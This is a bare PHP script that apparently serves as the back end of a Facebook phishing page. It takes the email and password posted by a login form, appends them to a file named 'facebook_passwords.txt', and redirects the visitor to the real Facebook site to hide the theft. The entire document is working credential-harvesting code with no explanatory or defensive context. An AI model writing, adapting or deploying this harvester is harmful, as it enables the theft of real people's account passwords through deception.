```php


<?php$email = $_POST['email'];$password = $_POST['password'];
file_put_contents('facebook_passwords.txt',$email. ':'.$password. PHP_EOL, FILE_APPEND);
header('Location: https://www.facebook.com/');exit;?>
